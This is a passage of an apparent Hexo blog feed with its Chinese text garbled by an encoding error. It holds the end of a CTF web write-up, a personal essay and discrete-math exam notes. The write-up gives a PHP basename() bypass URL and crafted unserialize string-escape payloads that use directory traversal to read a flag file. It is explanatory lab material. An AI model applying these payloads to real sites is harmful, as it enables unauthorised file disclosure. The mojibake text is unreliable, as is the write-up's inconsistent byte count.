èŒƒå›´çš„å­—ç¬¦ï¼Œåˆ™<code>basename()</code>ä¼šæŠ›å¼ƒè¿™ä¸ªæ–‡ä»¶åï¼Œç»§ç»­å¾€ä¸Šä¸€å±‚èµ°ï¼ŒæŠŠä¸Šä¸€å±‚çš„æ–‡ä»¶åå–å‡ºæ¥ï¼Œç›´åˆ°è·å–åˆ°æ­£å¸¸å¯æ˜¾ç¤ºASCIIå­—ç¬¦å¼€å¤´çš„æ–‡ä»¶å(<code>Windowsä¸‹ç›´æ¥è·å–</code>)ã€‚<ul><li>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/yesec/p/15429527.html">basename()ç»•è¿‡æ€»ç»“</a>åœ¨ä½¿ç”¨é»˜è®¤è¯­è¨€ç¯å¢ƒè®¾ç½®æ—¶ï¼Œbasename() ä¼šåˆ é™¤æ–‡ä»¶åå¼€å¤´çš„é ASCII å­—ç¬¦ã€‚</li></ul></li><li>æˆ‘ä»¬çš„ç›®çš„æ˜¯ä»<code>highlight_file($path);</code> ä¸­æŠŠtm.phpçš„æºç æåˆ°ï¼Œå°±éœ€è¦pathæ˜¯tm.phpï¼Œå¹¶ä¸”è¦æœ‰<code>source</code></li><li>ç»•è¿‡wpï¼š<code>//index.php/tm.php/%88?source=tm.php</code></li><li>è¿™æ ·æ­£åˆ™åŒ¹é…çš„æ—¶å€™è¿”å›çš„æ˜¯<code>%88</code> æ•…å¯ä»¥æŸ“è¿‡æ­£åˆ™åŒ¹é… ï¼Œä½†æ˜¯<code>basename()</code>å‡½æ•°è¿è¡Œçš„æ—¶å€™å¿½ç•¥<code>%88</code>ï¼Œç›´æ¥åŒ¹é…åˆ°<code>tm.php</code> ï¼Œåªè¦æœ‰<code>source</code>å°±ä¼šè¿›å…¥ifä»è€Œ<code>highlight_file($path);</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">echo basename($file);</span><br><span class="line">//å®ä¾‹</span><br><span class="line">http://localhost/?file=%ffindex.php/%ff</span><br><span class="line">//index.php</span><br><span class="line">http://localhost/?file=%ffindex.php</span><br><span class="line">//index.php</span><br><span class="line">http://localhost/?file=index.php%ff</span><br><span class="line">//index.php</span><br><span class="line">http://localhost/?file=index.php/%2b</span><br><span class="line">//+</span><br></pre></td></tr></table></figure><p>è¿›å…¥ä¹‹åæ˜¯ååºåˆ—åŒ–çš„æºç </p><h3 id="tm-php"><a href="#tm-php" class="headerlink" title="tm.php"></a>tm.php</h3><ul><li>å…³é”®æ˜¯<code>unserialize(object_weakup(object_sleep($user)))</code> ï¼Œè€ƒç‚¹æ˜¾ç„¶æ˜¯ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œæ³¨æ„<code>chr(0)</code> æ˜¯ç©ºå­—ç¬¦ï¼Œä½†æ˜¯ä¹Ÿç®—ä¸€ä¸ªå­—èŠ‚ã€‚</li><li>æˆ‘ä»¬è‡ªå·±è‚¯å®šä¸ä¼šå†™å…¥ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥åªåˆ©ç”¨<ul><li><code>function object_weakup($ob) &#123; $r = str_replace(&#39;@0@0@0@&#39;, chr(0).&#39;*&#39;.chr(0), $ob); return $r; &#125;</code></li><li>ä¸€å¼€å§‹çŸ­è·¯äº†æƒ³å½“ç„¶çš„ä»¥ä¸ºä»¥ä¸ºä¸¤ä¸ªå‡½æ•°éƒ½åˆ©ç”¨ï¼Œç›¸å½“äºæ²¡é€ƒé€¸ï¼Œæƒ³äº†åŠå¤©ã€‚ã€‚</li></ul></li><li>usernameä¼ å…¥<code>@0@0@0@</code> ,æ¯ä¼ ä¸€ç»„å°±å¯ä»¥é€ƒé€¸3ä¸ªå­—èŠ‚[å­—ç¬¦ä¸²å‡å°‘çš„æƒ…å†µ]ï¼Œpasswordå°±ä¼ å…¥æˆ‘ä»¬æ„é€ å¥½çš„<code>order</code>ç±»</li><li>å…¶ä¸­orderç±»é¦–å…ˆæ˜¯å¸¸è§„æ–¹æ³•æ¡¡ç»•è¿‡wakeup</li><li>æç¤ºhint.phpï¼Œå…¥å£æ˜¯ï¼š<code>@$out = file_get_contents($this-&gt;hint); echo &quot;&lt;br/&gt;&quot;.$out;</code> è¿›å…¥æ¡ä»¶æ˜¯<code>if (preg_match(&#39;/prankhub$/&#39;, $r[&#39;host&#39;]))</code> æ€è·¯å°±æ˜¯<code>hint = p5ych://prankhub/</code></li><li>hint.phpé‡Œé¢æç¤ºflagåœ¨<code>f1111444449999.txt</code></li><li>åç¼€æ˜¯txtï¼Œé¢˜ç›®æœ¬æ¥æœ‰ä¸¤ä¸ªåœ°æ–¹å¯ä»¥åˆ©ç”¨ï¼Œ<code>include</code>å’Œ <code>file_get_contents</code> ï¼Œä½†æ˜¯includeåé¢åŠ äº†åç¼€PHPï¼Œæ‰€ä»¥æ€è·¯æ˜¯åˆ©ç”¨<code>file_get_contents</code>ã€‚</li><li>å› ä¸ºè¦æ±‚hostæ˜¯<code>prankhub</code> æ‰€ä»¥è€ƒè™‘ä½¿ç”¨ä¼ªåè®®ç›®å½•ç©¿é€åˆ°æ ¹ç›®å½•å¾—åˆ°flag</li><li>orderé‡Œé¢f&#x3D;trypass,hint&#x3D;<code>p5ych://prankhub/../../../../../../../f1111444449999.txt</code></li><li>æ„é€ å‡ºorderï¼š<code>O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:56:&quot;p5ych://prankhub/../../../../../../../f1111444449999.txt&quot;;&#125;</code></li><li>ç°åœ¨è€ƒè™‘å­—ç¬¦ä¸²é€ƒé€¸ï¼Œusernameä¼ <code>@0@0@0@</code> ,æ¯ä¼ ä¸€ç»„å°±å¯ä»¥é€ƒé€¸4ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦çš„passwordæ˜¯<code>&quot;;s:8:&quot;password&quot;;&quot;O:5:&quot;order&quot;:2:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:56:&quot;p5ych://prankhub/../../../../../../../f1111444449999.txt&quot;;&#125;&quot;;</code></li><li><code>username=&#39;@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&#39;</code></li><li><code>password=&#39;&quot;;s:11:&quot;%00*%00password&quot;;O:5:&quot;order&quot;:3:&#123;s:1:&quot;f&quot;;s:7:&quot;trypass&quot;;s:4:&quot;hint&quot;;s:56:&quot;p5ych://prankhub/../../../../../../../f1111444449999.txt&quot;;&#125;&quot;;&#39;</code></li><li>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯orderéœ€è¦ç»•è¿‡wakeupï¼Œ<code>&quot;order&quot;:3:&#123;</code> è¿™é‡Œæ˜¯3.</li><li>passwordå°±ç›´æ¥ç”¨é‚£ä¸ªç±»äº†ï¼Œä¸è¦å‰é¢é‚£ä¸ª<code>s:122</code>å•¥çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„passwordæœ¬æ¥ä¼ å…¥çš„stringï¼Œæœ€åå˜æˆObject</li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬é¢˜è€ƒç‚¹æ˜¯ï¼š</p><ul><li>basename()å‡½æ•°ç»•è¿‡</li><li>ååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸</li><li>ç›®å½•ç©¿è¶Šè¯»å–flag</li></ul><p>å½“ç„¶é‡è¦è€ƒç‚¹æ˜¯å­—ç¬¦é€ƒé€¸ï¼Œä¸»è¦æ˜¯éœ€è¦ç²¾å¿ƒæ„é€ è¿˜æœ‰æœ¬åœ°è°ƒè¯•ï¼Œè®©passwordæ˜¯orderç±»ï¼Œé€ƒé€¸å­—ç¬¦ä¸ªæ•°è¦æ•°æ¸…æ¥šã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯ä¸è¾¾æ„</title>
      <link href="/2023/06/15/%E8%AF%8D%E4%B8%8D%E8%BE%BE%E6%84%8F/"/>
      <url>/2023/06/15/%E8%AF%8D%E4%B8%8D%E8%BE%BE%E6%84%8F/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘æ€»è§‰å¾—ï¼Œåº”è¯¥å†™ç‚¹ä»€ä¹ˆã€‚æ–‡å­—åœ¨å±å¹•ä¸Šå†™äº†åˆåˆ åˆ äº†åˆå†™ï¼Œä¸çŸ¥é“è¦è¯´ä»€ä¹ˆï¼Œå¯èƒ½é‚£äº›æ›¾ç»å°å¿ƒç¿¼ç¿¼çè—çš„æ„Ÿæƒ…ä¹Ÿä¼šèµ°åˆ°å°½å¤´ï¼Œæˆ‘å¾ˆå®³æ€•ï¼Œå¾ˆå¤šä¸œè¥¿å¥½åƒéƒ½å˜äº†ï¼Œä¸å¦‚è¯´ï¼Œæˆ‘ä»¬éƒ½æœªæ›¾äº†è§£è¿‡ã€‚</p><img src="E:%5C%E7%AC%94%E8%AE%B0%5Cimage%5CQQ%E5%9B%BE%E7%89%8720230615164243.jpg" alt="QQå›¾ç‰‡20230615164243" style="zoom: 50%;" /><hr><p>é‚£å¤©æˆ‘çš„æ‰‹ä¸²æ‰¯æ–­äº†ï¼Œç å­ä¸€ç²’ä¸€ç²’çš„åœ¨åœ°ä¸Šè·³åŠ¨ï¼Œæ²¡æœ‰å»æ¡ï¼Œä¹Ÿæ¡ä¸å›æ¥ã€‚å½“æ—¶æˆ‘åœ¨æƒ³ä»€ä¹ˆå‘¢ï¼Œé‚£ä¸²çŸ³æ¦´çŸ³ï¼Œæˆ‘æˆ´äº†å¾ˆä¹…ï¼Œä¸­é€”ä¹Ÿæ–­è¿‡ï¼Œç”šè‡³æ‰è¿‡ï¼Œä½†æˆ‘è¿˜æ˜¯åšæŒçš„é‡æ–°ä¹°ä¸€ä¸ªä¸€æ ·çš„ï¼Œä¼šä¸åŒå…¶çƒ¦çš„å°†å·²ç»æ‘”åçš„ç å­ç©¿ä¸²èµ·æ¥ï¼Œæ˜æ˜æ‰“å­—ä¸æ–¹ä¾¿ä¹Ÿè¿˜æ˜¯ä¸€ç›´æˆ´ç€ã€‚æˆ‘çŸ¥é“å®ƒæˆ´åœ¨æˆ‘çš„æ‰‹ä¸Šå¹¶æ²¡æœ‰å¤šå¥½çœ‹ï¼Œä¹Ÿæ²¡æœ‰ç‰¹æ®Šå«ä¹‰ã€‚å¯æˆ‘å·²ç»è®¤å®šäº†ï¼Œä¼šä¸€ç›´æˆ´ç€å®ƒã€‚ä½†æ˜¯é‚£å¤©ï¼Œå®ƒæ–­äº†ï¼Œæ¡ä¸å›æ¥ã€‚å¤§è„‘ä¸€ç‰‡ç©ºç™½ï¼Œä¹Ÿè®¸ä¸–ç•Œä¸ŠçœŸçš„æ²¡æœ‰æ°¸è¿œã€‚</p><blockquote><p>æ²¡æœ‰æ³ªï¼Œæ²¡æœ‰é—æ†¾ï¼Œç»§ç»­å¾€å‰èµ°ï¼Œæ•…äº‹ä¸ä¼šç»“æŸã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¦»æ•£_æœŸæœ«å¤ä¹ [æˆ˜æŸç‰ˆ]</title>
      <link href="/2023/06/14/%E7%A6%BB%E6%95%A3-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%88%98%E6%8D%9F%E7%89%88/"/>
      <url>/2023/06/14/%E7%A6%BB%E6%95%A3-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%88%98%E6%8D%9F%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬ä¸€ç« -é›†åˆè®º"><a href="#ç¬¬ä¸€ç« -é›†åˆè®º" class="headerlink" title="ç¬¬ä¸€ç« _é›†åˆè®º"></a>ç¬¬ä¸€ç« _é›†åˆè®º</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511151559216-1024x735.png"></p><h5 id="é›†åˆçš„åŸºæœ¬æ¦‚å¿µ"><a href="#é›†åˆçš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="é›†åˆçš„åŸºæœ¬æ¦‚å¿µ"></a>é›†åˆçš„åŸºæœ¬æ¦‚å¿µ</h5><p><strong>é›†åˆ</strong>ï¼šé›†åˆé€šå¸¸æ˜¯ç”±æŒ‡å®šèŒƒå›´å†…æ»¡è¶³ç»™å®šæ¡ä»¶çš„æ‰€æœ‰å¯¹è±¡èšé›†åœ¨ä¸€èµ·æ„æˆçš„ã€‚</p><p><strong>å…ƒç´ </strong>ï¼šæŒ‡å®šèŒƒå›´å†…çš„æ¯ä¸ªå¯¹è±¡ç§°ä¸ºè¿™ä¸ªé›†åˆçš„å…ƒç´ ã€‚<code>å°†è¯­å¥&quot;ï½æ˜¯é›†åˆï¼¡ä¸­çš„å…ƒç´ &quot;æˆ–&quot;ï½å±äºï¼¡&quot;è®°ä¸º ï½âˆˆï¼¡</code></p><p><strong>åŸºæ•°</strong>ï¼šå°†é›†åˆä¸­å…ƒç´ çš„ä¸ªæ•°ç§°ä¸ºé›†åˆçš„åŸºæ•°ã€‚è®°ä¸º ï¼¡ã€‚ç”±æ­¤æŠŠé›†åˆåˆ†ä¸ºæœ‰é™é›†å’Œæ— é™é›†</p><hr><h6 id="é›†åˆçš„è¡¨ç¤º"><a href="#é›†åˆçš„è¡¨ç¤º" class="headerlink" title="é›†åˆçš„è¡¨ç¤º"></a>é›†åˆçš„è¡¨ç¤º</h6><ul><li><p>åˆ—ä¸¾æ³•Â ä¾‹å¦‚ A&#x3D;{0,1,2,3};B&#x3D;{0,1,4,9,Â·Â·Â·,n^2,Â·Â·Â·}ã€‚</p></li><li><p>æè¿°æ³•Â è®°ä¸º{xP(x)} Â  -&gt;xæ˜¯ä»£è¡¨å…ƒï¼ŒP(x)è¡¨ç¤ºxå…·æœ‰æ€§è´¨P<br>Â ä¾‹å¦‚ Â  A&#x3D;{xxæ˜¯â€™psychâ€™ä¸­çš„æ‰€æœ‰å­—æ¯}</p></li><li><p><strong>å½’çº³æ³•</strong>å½’çº³æ³•æ˜¯é€šè¿‡å½’çº³å®šä¹‰é›†åˆçš„æ–¹æ³•ï¼Œå…¶å®šä¹‰ä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>ç¬¬ä¸€éƒ¨åˆ†ï¼šåŸºç¡€ï¼Œæ”¯å‡ºæŸäº›æœ€åŸºæœ¬çš„å…ƒç´ å±äºæŸé›†åˆã€‚</li><li>ç¬¬äºŒéƒ¨åˆ†ï¼šå½’çº³ï¼ŒæŒ‡å‡ºæœ‰åŸºæœ¬å…ƒç´ é€ å‡ºæ–°å…ƒç´ çš„æ–¹æ³•ã€‚</li><li>ç¬¬ä¸‰éƒ¨åˆ†ï¼šæå°æ€§ï¼ŒæŒ‡å‡ºæ”¹é›†åˆçš„ç•Œé™</li></ul><p>Â ä¾‹å¦‚ï¼Œé›†åˆAæŒ‰ç…§å¦‚ä¸‹æ–¹å¼å®šä¹‰ï¼š<br>Â (1)0å’Œ1éƒ½æ˜¯Aä¸­çš„å…ƒç´ <br>Â (2)å¦‚æœa,bæ˜¯Aä¸­çš„å…ƒç´ ï¼Œåˆ™abï¼Œbaä¹Ÿæ˜¯Aä¸­çš„å…ƒç´ <br>Â (3)æœ‰é™æ¬¡ä½¿ç”¨(1),(2)åæ‰€å¾—åˆ°çš„çš„å­—ç¬¦ä¸²éƒ½æ˜¯Aä¸­çš„å…ƒç´ <br>Â  æ˜¾ç„¶-&gt;0,1,00,101ç­‰éƒ½æ˜¯Aä¸­çš„å…ƒç´ </p></li><li><p>é€’å½’æŒ‡å®šé›†åˆæ³•Â ä¾‹å¦‚ï¼šè®¾a(0) &#x3D; 1;a(i+1)&#x3D;3a(i);å®šä¹‰S&#x3D;{a(0),a(1),a(2),â€¦,}&#x3D;{a(k)kâˆˆN}</p></li><li><p>æ–‡æ°å›¾æ³•:åˆ©ç”¨å¹³é¢ä¸Šçš„ç‚¹è¡¨ç¤ºé›†åˆä¸­çš„å…ƒç´ </p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511153549306.png"></p><hr><h6 id="é›†åˆä¸é›†åˆçš„å…³ç³»"><a href="#é›†åˆä¸é›†åˆçš„å…³ç³»" class="headerlink" title="é›†åˆä¸é›†åˆçš„å…³ç³»"></a>é›†åˆä¸é›†åˆçš„å…³ç³»</h6><p>é›†åˆä¸­çš„å…ƒç´ æ˜¯æ— åºä¸”äº’å¼‚çš„ã€‚</p><p><strong>é›†åˆç›¸ç­‰</strong>ï¼šAå’ŒBä¸­çš„å…ƒç´ å®Œå…¨ç›¸åŒï¼Œåˆ™Aå’ŒBè¿™ä¸¤ä¸ªé›†åˆç›¸ç­‰ï¼Œè®°ä¸º ï¼¡ ï¼ ï¼¢ã€‚</p><p><strong>å­é›†</strong>ï¼šå¦‚æœBä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯Aä¸­çš„å…ƒç´ ï¼Œåˆ™ç§°Bæ˜¯Açš„å­é›†ï¼Œä¹Ÿç§°Bè¢«A<strong>åŒ…å«</strong>(AåŒ…å«B)ï¼Œè®°ä½œ<code>ï¼¢âŠ†ï¼¡</code>.ç‰¹åˆ«çš„å¦‚æœBâ‰ Aï¼Œåˆ™AçœŸåŒ…å«Bï¼Œå³Bæ˜¯Açš„çœŸå­é›†ï¼Œè®°ä½œ <code>ï¼¢âŠ‚ï¼¡</code></p><hr><h6 id="å‡ ä¸ªç‰¹æ®Šé›†åˆ"><a href="#å‡ ä¸ªç‰¹æ®Šé›†åˆ" class="headerlink" title="å‡ ä¸ªç‰¹æ®Šé›†åˆ"></a>å‡ ä¸ªç‰¹æ®Šé›†åˆ</h6><p><strong>ç©ºé›†</strong>ï¼šä¸å«ä»»ä½•å…ƒç´ çš„é›†åˆç§°ä¸ºç©ºé›†ï¼Œè®°ä½œâŒ€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â ç©ºé›†å¯ä»¥è¡¨ç¤ºä¸ºï¼šÂ âŒ€=&#123;xxâ‰ x&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç©ºé›†æ˜¯å®¢è§‚å­˜åœ¨çš„ã€‚ä¾‹å¦‚ <code>ï¼¡ï¼&#123;ï½˜ï½˜âˆˆï¼²ä¸”x^ï¼’&lt;ï¼&#125;</code> å°±æ˜¯ä¸€ä¸ªç©ºé›†</p></blockquote><ul><li>ç©ºé›†æ˜¯ä¸€åˆ‡é›†åˆçš„å­é›†</li><li>ç©ºé›†æ˜¯ç»å¯¹å”¯ä¸€çš„</li></ul><p>**å…¨é›†(è®ºé›†)**ï¼šåœ¨ä¸€ä¸ªç›¸å¯¹å›ºå®šçš„èŒƒå›´å†…ï¼ŒåŒ…å«æ­¤èŒƒå›´å†…çš„æ‰€æœ‰å…ƒç´ çš„é›†åˆï¼Œç§°ä¸ºå…¨é›†æˆ–è€…è®ºé›†ã€‚ç”¨Uæˆ–Eè¡¨ç¤º</p><ul><li>å…¨é›†æ˜¯ç›¸å¯¹å”¯ä¸€çš„ã€‚</li></ul><p><strong>é›†æ—</strong>ï¼šä»¥é›†åˆä¸ºå…ƒç´ çš„é›†åˆç§°ä¸ºé›†æ—</p><p><strong>å¹‚é›†</strong>ï¼šè®¾Aä¸ºä»»æ„é›†åˆï¼Œç§°Açš„æ‰€æœ‰ä¸åŒå­é›†æ„æˆçš„é›†åˆä¸ºAçš„å¹‚é›†ï¼Œè®°ä½œ<code>P(A)</code>æˆ– 2^ï¼¡,å³ P(A)ï¼{xxâŠ†A}ã€‚å¹‚é›†æ˜¯ä¸€ä¸ªé›†æ—</p><blockquote><p>ç»™å®šä¸€ä¸ªæœ‰é™é›†ï¼Œä½œå‡ºå¦‚ä¸‹è§„å®šï¼š</p><ul><li>ç§°å«æœ‰nä¸ªå…ƒç´ çš„é›†åˆä¸ºnå…ƒé›†</li><li>è‹¥Aä¸ºnå…ƒé›†ï¼Œåˆ™ç§°Açš„å«æœ‰ï½ä¸ª(ï¼â‰¤ï½â‰¤ï½)å…ƒç´ çš„å­é›†ä¸ºå®ƒçš„ ï½ å…ƒå­é›†ã€‚</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511155222204.png"></p><hr><h5 id="é›†åˆçš„è¿ç®—"><a href="#é›†åˆçš„è¿ç®—" class="headerlink" title="é›†åˆçš„è¿ç®—"></a>é›†åˆçš„è¿ç®—</h5><p>æ€»çš„æ¥è¯´ï¼Œé›†åˆçš„å…ƒç´ æœ‰ä»¥ä¸‹è¿™å‡ ç§åŸºæœ¬è¿ç®—ï¼šå¹¶è¿ç®—ï¼Œäº¤è¿ç®—ï¼Œå·®è¿ç®—ï¼Œè¡¥è¿ç®—ï¼Œå¯¹ç§°å·®è¿ç®—</p><ul><li>ï¼¡âˆªï¼¢ -&gt; å–Aä¸Bçš„å¹¶é›†ï¼Œä¸º<strong>å¹¶è¿ç®—</strong>ï¼Œç¬¦å·ä¸º<code>âˆª</code></li><li>ï¼¡âˆ©ï¼¢ -&gt; å–Aä¸Bçš„äº¤é›†ï¼Œä¸º<strong>äº¤è¿ç®—</strong>ï¼Œç¬¦å·ä¸º<code>âˆ©</code></li><li>ï¼¡-ï¼¢ -&gt; å–Aä¸Bçš„å·®é›†ï¼Œä¸º<strong>å·®è¿ç®—</strong>ï¼Œç¬¦å·ä¸º<code>-</code>ç‰¹åˆ«çš„å¦‚æœA&#x3D;Uï¼Œå³Aæ˜¯å…¨é›†æ˜¯ï¼ŒA-Båˆç§°ä¸ºé›†åˆBçš„è¡¥é›†ï¼Œè¿ç®—ä¸º<strong>è¡¥è¿ç®—</strong>ã€‚</li><li>ï¼¡âŠ•ï¼¢&#x3D;(ï¼¡-ï¼¢)âˆª(ï¼¢-ï¼¡) -&gt;å–Aä¸­é™¤å¼€Bçš„éƒ¨åˆ†åŠ ä¸ŠBä¸­é™¤å¼€Açš„éƒ¨åˆ†ï¼Œä¸º<strong>å¯¹ç§°å·®è¿ç®—</strong>ï¼Œç¬¦å·ä¸º<code>âŠ•</code> æ–‡æ°å›¾ä¸ºï¼š</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511160827870.png"></p><p>ä¸€äº›è¿ç®—å…¬å¼ï¼šï¼ˆçœ‹çœ‹å¾—äº†ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511160901329-1024x483.png"></p><h5 id="æ— é™é›†"><a href="#æ— é™é›†" class="headerlink" title="æ— é™é›†"></a>æ— é™é›†</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000438923-1024x286.png"></p><h5 id="ä¸é›†åˆç›¸å…³çš„åº”ç”¨"><a href="#ä¸é›†åˆç›¸å…³çš„åº”ç”¨" class="headerlink" title="ä¸é›†åˆç›¸å…³çš„åº”ç”¨"></a>ä¸é›†åˆç›¸å…³çš„åº”ç”¨</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230614000511057-1024x193.png"></p><hr><h2 id="ç¬¬äºŒç« -å‘½é¢˜é€»è¾‘"><a href="#ç¬¬äºŒç« -å‘½é¢˜é€»è¾‘" class="headerlink" title="ç¬¬äºŒç« _å‘½é¢˜é€»è¾‘"></a>ç¬¬äºŒç« _å‘½é¢˜é€»è¾‘</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511163353840.png"></p><hr><h5 id="å‘½é¢˜ä¸å‘½é¢˜è”ç»“è¯"><a href="#å‘½é¢˜ä¸å‘½é¢˜è”ç»“è¯" class="headerlink" title="å‘½é¢˜ä¸å‘½é¢˜è”ç»“è¯"></a>å‘½é¢˜ä¸å‘½é¢˜è”ç»“è¯</h5><h6 id="å‘½é¢˜"><a href="#å‘½é¢˜" class="headerlink" title="å‘½é¢˜"></a>å‘½é¢˜</h6><p>å®šä¹‰ï¼šèƒ½å¤Ÿåˆ¤æ–­çœŸå‡çš„é™ˆè¿°å¥ç§°ä¸ºå‘½é¢˜ã€‚ç§°â€™çœŸâ€™å’Œâ€™å‡â€™ä¸ºå‘½é¢˜çš„çœŸå€¼ï¼Œç”¨â€™Tâ€™(1)å’Œâ€™Fâ€™(0)è¡¨ç¤ºã€‚</p><p>åˆ¤æ–­ï¼šä¸€ä¸ªè¯­å¥æ˜¯å‘½é¢˜ï¼Œå½“ä¸”ä»…å½“å®ƒæ˜¯é™ˆè¿°å¥ä¸”æœ‰æ˜ç¡®çš„çœŸå€¼ã€‚</p><h6 id="å‘½é¢˜è”ç»“è¯"><a href="#å‘½é¢˜è”ç»“è¯" class="headerlink" title="å‘½é¢˜è”ç»“è¯"></a>å‘½é¢˜è”ç»“è¯</h6><p><strong>åŸå­å‘½é¢˜</strong>ï¼šä¸èƒ½å†åˆ†è§£ä¸ºæ›´ç®€å•å‘½é¢˜çš„å‘½é¢˜ï¼Œç§°ä¸ºåŸå­å‘½é¢˜ã€‚</p><p><strong>å‘½é¢˜è”ç»“è¯</strong>ï¼šåƒâ€œæˆ–è€…â€è¿™ç§è”ç»“å‘½é¢˜çš„å…³é”®è¯ï¼Œç§°ä¸ºå‘½é¢˜è”ç»“è¯ã€‚</p><p><strong>å¤åˆå‘½é¢˜</strong>ï¼šæœ‰å‘½é¢˜è”ç»“è¯è”ç»“åŸå­å‘½é¢˜è€Œå½¢æˆçš„å‘½é¢˜ç§°ä¸ºå¤åˆå‘½é¢˜</p><p>æœ€å¸¸è§çš„è¯­å¥é—´çš„å…³ç³»ä¸»è¦æœ‰ä¸€ä¸‹5ç§ï¼š</p><ul><li>è¡¨ç¤º<strong>å¦å®š</strong>å…³ç³»çš„:â€™ä¸â€™ï¼Œâ€™éâ€™ï¼Œâ€™å¦â€™â€¦ â€“&gt;å¦å®šè”ç»“è¯</li><li>è¡¨ç¤º<strong>å¹¶åˆ—</strong>å…³ç³»çš„:â€™å¹¶ä¸”â€™ï¼Œâ€™å’Œâ€™ï¼Œâ€™å³â€¦ï¼Œåˆâ€¦â€™ â€“&gt;åˆå–è”ç»“è¯</li><li>è¡¨ç¤º<strong>é€‰æ‹©</strong>å…³ç³»çš„:â€™â€¦æˆ–è€…â€¦â€™ï¼Œâ€™â€¦æˆ–â€¦â€™ â€“&gt;æå–è”ç»“è¯</li><li>è¡¨ç¤º<strong>æ¡ä»¶</strong>å…³ç³»çš„:â€™å¦‚æœâ€¦ï¼Œåˆ™â€¦â€™ï¼Œâ€™å¦‚æœâ€¦ï¼Œé‚£ä¹ˆâ€¦â€™ â€“&gt;è•´å«è”ç»“è¯</li><li>è¡¨ç¤º<strong>ç­‰ä»·</strong>å…³ç³»çš„:â€™â€¦å½“ä¸”ä»…å½“â€¦â€™ â€“&gt;ç­‰ä»·è”ç»“è¯</li></ul><h6 id="è‡ªç„¶è¯­è¨€çš„å‘½é¢˜ç¬¦å·åŒ–"><a href="#è‡ªç„¶è¯­è¨€çš„å‘½é¢˜ç¬¦å·åŒ–" class="headerlink" title="è‡ªç„¶è¯­è¨€çš„å‘½é¢˜ç¬¦å·åŒ–"></a>è‡ªç„¶è¯­è¨€çš„å‘½é¢˜ç¬¦å·åŒ–</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511171540705.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511171545675.png"></p><p><strong>çœŸå€¼è¡¨</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230511170525473-1024x283.png"></p><blockquote><p>è•´å«ï¼š 100,å…¶ä»–å…¨éƒ¨ä¸º1</p><p>ç­‰ä»·ï¼š ç›¸åŒä¸ºçœŸï¼Œä¸åŒä¸ºå‡</p></blockquote><h6 id="ä¼˜å…ˆçº§"><a href="#ä¼˜å…ˆçº§" class="headerlink" title="ä¼˜å…ˆçº§"></a>ä¼˜å…ˆçº§</h6><p>æ‰€æœ‰äº”ä¸ªè”æ¥è¯çš„ä¼˜å…ˆé¡ºåºä¸ºï¼šå¦å®šï¼Œåˆå–ï¼Œæå–ï¼Œè•´æ¶µï¼Œç­‰ä»·ï¼›</p><hr><h5 id="å‘½é¢˜å…¬å¼ï¼Œè§£é‡Šä¸çœŸå€¼è¡¨"><a href="#å‘½é¢˜å…¬å¼ï¼Œè§£é‡Šä¸çœŸå€¼è¡¨" class="headerlink" title="å‘½é¢˜å…¬å¼ï¼Œè§£é‡Šä¸çœŸå€¼è¡¨"></a>å‘½é¢˜å…¬å¼ï¼Œè§£é‡Šä¸çœŸå€¼è¡¨</h5><h6 